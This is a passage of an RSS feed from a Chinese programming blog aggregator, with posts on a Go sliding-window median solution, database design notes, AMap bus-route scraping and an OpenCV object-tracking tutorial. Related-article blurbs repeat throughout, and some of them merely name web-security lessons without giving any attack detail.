压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:43 +0000</pubDate>
    </item>
    <item>
      <title>Golang | Leetcode Golang题解之第480题滑动窗口中位数</title>
      <link>https://www.ppmy.cn/news/1540406.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Golang | Leetcode Golang题解之第480题滑动窗口中位数news/2025/10/31 17:53:42/题目：题解：type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice = append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a := h.IntSlice; v := a[len(a)-1]; h.IntSlice = a[:len(a)-1]; return v }
func (h *hp) push(v int)         { h.size++; heap.Push(h, v) }
func (h *hp) pop() int           { h.size--; return heap.Pop(h).(int) }
func (h *hp) prune() {for h.Len() &gt; 0 {num := h.IntSlice[0]if h == small {num = -num}if d, has := delayed[num]; has {if d &gt; 1 {delayed[num]--} else {delete(delayed, num)}heap.Pop(h)} else {break}}
}var delayed map[int]int
var small, large *hpfunc medianSlidingWindow(nums []int, k int) []float64 {delayed = map[int]int{} // 哈希表，记录「延迟删除」的元素，key 为元素，value 为需要删除的次数small = &amp;hp{}           // 大根堆，维护较小的一半元素large = &amp;hp{}           // 小根堆，维护较大的一半元素makeBalance := func() {// 调整 small 和 large 中的元素个数，使得二者的元素个数满足要求if small.size &gt; large.size+1 { // small 比 large 元素多 2 个large.push(-small.pop())small.prune() // small 堆顶元素被移除，需要进行 prune} else if small.size &lt; large.size { // large 比 small 元素多 1 个small.push(-large.pop())large.prune() // large 堆顶元素被移除，需要进行 prune}}insert := func(num int) {if small.Len() == 0 || num &lt;= -small.IntSlice[0] {small.push(-num)} else {large.push(num)}makeBalance()}erase := func(num int) {delayed[num]++if num &lt;= -small.IntSlice[0] {small.size--if num == -small.IntSlice[0] {small.prune()}} else {large.size--if num == large.IntSlice[0] {large.prune()}}makeBalance()}getMedian := func() float64 {if k&amp;1 &gt; 0 {return float64(-small.IntSlice[0])}return float64(-small.IntSlice[0]+large.IntSlice[0]) / 2}for _, num := range nums[:k] {insert(num)}n := len(nums)ans := make([]float64, 1, n-k+1)ans[0] = getMedian()for i := k; i &lt; n; i++ {insert(nums[i])erase(nums[i-k])ans = append(ans, getMedian())}return ans
}http://www.ppmy.cn/news/1540406.html相关文章学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:42 +0000</pubDate>
    </item>
    <item>
      <title>学习的文档10/14</title>
      <link>https://www.ppmy.cn/news/1540405.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维学习的文档10/14news/2025/10/31 17:53:41/为什么不推荐使用外键与级联?【强制】不得使用外键与级联，一切外键概念必须在应用层解决。说明: 以学生和成绩的关系为例，学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，即为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度（来源于阿里巴巴开发手册）为什么不要用外键呢？大部分人可能会这样回答：增加了复杂性：a. 每次做 DELETE 或者 UPDATE 都必须考虑外键约束，会导致开发的时候很痛苦, 测试数据极为不方便; b. 外键的主从关系是定的，假如那天需求有变化，数据库中的这个字段根本不需要和其他表有关联的话就会增加很多麻烦。增加了额外工作：数据库需要增加维护外键的工作，比如当我们做一些涉及外键字段的增，删，更新操作之后，需要触发相关操作去检查，保证数据的的一致性和正确性，这样会不得不消耗数据库资源。如果在应用层面去维护的话，可以减小数据库压力；对分库分表不友好：因为分库分表下外键是无法生效的。……我个人觉得上面这种回答不是特别的全面，只是说了外键存在的一个常见的问题。实际上，我们知道外键也是有很多好处的，比如：保证了数据库数据的一致性和完整性；级联操作方便，减轻了程序代码量；等。。。。。。所以说，不要一股脑的就抛弃了外键这个概念，既然它存在就有它存在的道理，如果系统不涉及分库分表，并发量不是很高的情况还是可以考虑使用外键的。什么是存储过程?我们可以把存储过程看成是一些 SQL 语句的集合，中间加了点逻辑控制语句。存储过程在业务比较复杂的时候是非常实用的，比如很多时候我们完成一个操作可能需要写一大串 SQL 语句，这时候我们就可以写有一个存储过程，这样也方便了我们下一次的调用。存储过程一旦调试完成通过后就能稳定运行，另外，使用存储过程比单纯 SQL 语句执行要快，因为存储过程是预编译过的。存储过程在互联网公司应用不多，因为存储过程难以调试和扩展，而且没有移植性，还会消耗数据库资源。阿里巴巴 Java 开发手册里：要求禁止使用存储过程。下载地址：Java手册页面-阿里云开发者社区-阿里云官网开发者社区_云计算社区drop、delete 与truncate 区别?用法不同:drop(丢弃数据):drop table 表名，直接将表都删除掉，在删除表的时候使用。truncate(清空数据) :truncate table 表名，只删除表中的数据，再插入数据的时候自增长 id 又从 1 开始，在清空表中数据的时候使用。delete（删除数据） :delete from 表名 where 列名=值，删除某一行的数据，如果不加where子句和truncate table 表名作用类似。truncate和不带where子句的delete、以及drop都会删除表内的数据，但是truncate和delete只删除数据不删除表的结构(定义)，执行drop语句，此表的结构也会删除，也就是执行drop之后对应的表不复存在属于不同的数据库语言：truncate和drop属于 DDL(数据定义语言)语句，操作立即生效，原数据不放到 rollback segment 中，不能回滚，操作不触发 trigger。而delete语句是 DML (数据库操作语言)语句，这个操作会放到 rollback segment 中，事务提交之后才生效。总结如果要删除整个数据库对象，使用drop。如果要删除表中的部分行数据，可以使用delete并配合WHERE子句。如果要快速删除表中的所有数据且不需要恢复数据，可以使用truncate。http://www.ppmy.cn/news/1540405.html相关文章利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:42 +0000</pubDate>
    </item>
    <item>
      <title>利用高德API获取整个城市的公交路线并可视化（六）</title>
      <link>https://www.ppmy.cn/news/1540404.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维利用高德API获取整个城市的公交路线并可视化（六）news/2025/10/31 17:53:40/记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。先讲一下方法思路，一共四个步骤；方法思路高德开放平台的JS API 1.4 示例里面的地铁线路查询模块下载指定站点的json文件读取线路的折点坐标，并连成线段坐标转换——高德坐标系（GCJ-02） to WGS84导出csv和shp文件高德开放平台官方示例链接：公交线路查询-公交信息查询-示例中心-JS API 1.4 示例 | 高德地图API (amap.com)前半部分的实现逻辑可以参考上篇文章：http://www.ppmy.cn/news/1540404.html相关文章OpenCV-物体跟踪文章目录 一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项 OpenCV是一个开源的计算机视觉和机器学习软件库&amp;#xff0c;它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释&amp;#xff1a; 一、物体跟踪的…阅读更多...[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:41 +0000</pubDate>
    </item>
    <item>
      <title>OpenCV-物体跟踪</title>
      <link>https://www.ppmy.cn/news/1540403.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维OpenCV-物体跟踪news/2025/10/31 17:53:40/文章目录一、物体跟踪的定义二、OpenCV中的物体跟踪算法三、OpenCV物体跟踪的实现步骤四、代码实现五、注意事项OpenCV是一个开源的计算机视觉和机器学习软件库，它提供了丰富的功能来实现物体跟踪。以下是对OpenCV中物体跟踪的详细解释：一、物体跟踪的定义物体跟踪是指在视频序列中，对某一特定物体进行持续定位的过程。它通常涉及在视频的第一帧中手动或自动选择目标物体，然后在后续帧中跟踪该物体的位置和运动轨迹。二、OpenCV中的物体跟踪算法OpenCV提供了多种物体跟踪算法，每种算法都有其独特的优点和适用场景。以下是一些常见的OpenCV物体跟踪算法：BOOSTING：基于AdaBoost算法的跟踪器，它使用一组弱分类器来构建一个强分类器，用于跟踪目标物体。MIL（Multiple Instance Learning）：一种基于机器学习的跟踪算法，它通过学习目标的外观模型来跟踪目标。KCF（Kernelized CorrelationFilters）：一种基于核相关滤波器的跟踪算法，它利用目标的时空上下文信息来跟踪目标，具有较高的跟踪速度和准确性。TLD（Tracking-Learning-Detection）：一种结合了跟踪、学习和检测三种技术的跟踪算法，它能够在目标被遮挡或消失后重新检测到目标。MEDIANFLOW：一种基于光流法的跟踪算法，它利用目标的运动信息来跟踪目标，对于缓慢移动的目标具有较好的跟踪效果。GOTURN：一种基于深度学习的跟踪算法，它使用卷积神经网络来提取目标的特征，并通过回归网络来预测目标的位置。MOSSE（Minimum Output Sum of SquaredError）：一种基于最小输出平方和误差的跟踪算法，它利用目标的灰度信息来跟踪目标，具有较快的跟踪速度。CSRT（Channel and Spatial ReliabilityTracker）：一种结合了通道和空间可靠性的跟踪算法，它能够在复杂场景下准确地跟踪目标。三、OpenCV物体跟踪的实现步骤使用OpenCV实现物体跟踪通常包括以下几个步骤：读取视频：使用cv2.VideoCapture()函数读取视频文件或摄像头捕获的视频流。初始化跟踪器：根据选择的跟踪算法，使用相应的函数（如cv2.TrackerCSRT_create()）初始化跟踪器。选择初始目标：在视频的第一帧中，使用cv2.selectROI()函数手动选择目标物体的边界框。初始化跟踪器：使用tracker.init()函数将选择的初始目标边界框传递给跟踪器，并初始化跟踪器。跟踪目标：在视频的后续帧中，使用tracker.update()函数更新跟踪器的状态，并获取目标物体的新边界框。绘制边界框：使用cv2.rectangle()函数在视频帧上绘制目标物体的边界框，以显示跟踪效果。显示视频：使用cv2.imshow()函数显示包含边界框的视频帧。退出循环：当视频播放完毕或按下特定按键时，退出循环并释放资源。四、代码实现importcv2# 创建一个CSRT跟踪器实例tracker=cv2.TrackerCSRT_create()# 跟踪标志，默认Falsetracking=Falsecap=cv2.VideoCapture('test.avi')whileTrue:# 从摄像头读取每一帧图像ret,frame=cap.read()ifnotret:break# 检查是否有按键被按下，如果是'a'，则设置追踪标志为True，并选择ROIifcv2.waitKey(1)==ord('a'):tracking=True# 让用户在当前帧选择一个矩阵区域作为跟踪对象roi=cv2.selectROI('Tracking',frame,showCrosshair=False)# 是否显示十字准星# 初始化跟踪器，传入当前帧和选定的ROItracker.init(frame,roi)# 如果跟踪器标志为Ture，则更新追踪器iftracking:success,box=tracker.update(frame)# 如果成功，获取位置ifsuccess:x,y,w,h=[int(v)forvinbox]# 在frame中绘制矩形框以显示跟踪结果cv2.rectangle(frame,(x,y),(x+w,y+h),(0,0,255),2)# 显示处理后的帧cv2.imshow('Tracking',frame)ifcv2.waitKey(100)==27:breakcap.release()cv2.destroyAllWindows()上述代码是跟踪人物图像的实现，通过读取视频，然后按下a键来绘制图像框，对人物进行跟踪，大概图像如下：然后点击ESC键继续进行视频播放，此时随着被标记人物的移动，标记框也会随之移动，如下图：五、注意事项选择合适的跟踪算法：不同的跟踪算法适用于不同的场景和目标。在选择跟踪算法时，需要根据实际情况进行评估和选择。处理遮挡和丢失：在跟踪过程中，目标物体可能会被遮挡或丢失。为了处理这种情况，可以使用一些策略，如重新初始化跟踪器、使用检测算法辅助跟踪等。优化性能：在实际应用中，需要考虑跟踪算法的性能和效率。可以通过调整算法参数、使用更高效的实现方式等方法来优化性能。总之，OpenCV提供了多种物体跟踪算法和工具，可以帮助用户实现高效的物体跟踪功能。在使用OpenCV进行物体跟踪时，需要根据实际情况选择合适的算法和参数，并处理可能出现的遮挡和丢失等问题。http://www.ppmy.cn/news/1540403.html相关文章[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别目录 
一、产品线路图 
1、产品路线图的内容 
2、产品路线图的绘制步骤 
3、产品路线图的作用与目的 
4、产品路线图的应用场景 
二、技术线路图 
1、定义与特征 
2、种类与分类 
3、作用与意义 
4、绘制方法 
5、案例分享 
三、产品线路图与技术线路图区别 
1、定义与关注点 
…阅读更多...tPS+redis限流算法拓展: 
压力测试概念及方法(TPS/并发量)_压测tps-CSDN博客 
压测指标TPS和QPS_压测tps-CSDN博客 
------------------------------------------------------------------------------ 
基于Redis限流&amp;#xff08;固定窗口、滑动窗口、漏桶、令牌桶&amp;#xff09;&amp;#xff08;肝货…阅读更多...DAY47WEB 攻防-PHP 应用文件上传函数缺陷条件竞争二次渲染黑白名单JS 绕过1、PHP-原生态-文件上传-检测后缀&amp;黑白名单2、PHP-原生态-文件上传-检测信息&amp;类型内容3、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷4、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷 文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题…阅读更多...使用 Git LFS（大文件存储）Git LFS&amp;#xff08;Large File Storage&amp;#xff09;是一种扩展 Git 的工具&amp;#xff0c;旨在更有效地管理大文件的版本控制。它通过将大文件的内容存储在 Git 之外来解决 Git 在处理大文件时的性能问题。 
主要特点 
替代存储&amp;#xff1a;Git LFS 不直接将大文件存储在 Git 仓库…阅读更多...基于STM32的电动汽车遥控器设计引言 
本项目设计了一个基于STM32的电动汽车遥控器&amp;#xff0c;能够通过无线通信&amp;#xff08;如蓝牙或射频模块&amp;#xff09;控制电动汽车的前进、后退、左右转向等动作。该遥控器采用按键或摇杆操作&amp;#xff0c;并通过无线模块将控制指令发送给汽车控制端&amp;#xff0c;实现远程操…阅读更多...数据结构练习题4(链表)1两两交换链表中的节点 
给你一个链表&amp;#xff0c;两两交换其中相邻的节点&amp;#xff0c;并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题&amp;#xff08;即&amp;#xff0c;只能进行节点交换&amp;#xff09;。 示例 1&amp;#xff1a; 输入&amp;#xff1a;head  [1,2,3,4]…阅读更多...上海市计算机学会竞赛平台2024年10月月赛丙组游戏闯关题目描述 
小爱现在想要通关一个游戏&amp;#xff0c;已知这个游戏主角的生命值没有上限&amp;#xff0c;但当游戏过程中任意时刻一旦生命值小于等于零、则游戏会结束。 
已知该游戏共有 nn 的关卡&amp;#xff0c;第 ii 个关卡有一个参数 aiai​&amp;#xff0c;当 ai&gt;0ai​&gt;0 时表示小爱…阅读更多...Spring Boot技术栈在电影评论网站中的应用2相关技术 
2.1 MYSQL数据库 MySQL是一个真正的多用户、多线程SQL数据库服务器。 是基于SQL的客户/服务器模式的关系数据库管理系统&amp;#xff0c;它的有点有有功能强大、使用简单、管理方便、安全可靠性高、运行速度快、多线程、跨平台性、完全网络化、稳定性等&amp;#xff0c;非常…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:40 +0000</pubDate>
    </item>
    <item>
      <title>[产品管理-48]：产品生命周期 - 产品线路图、技术线路图以及各自的区别</title>
      <link>https://www.ppmy.cn/news/1540402.html</link>
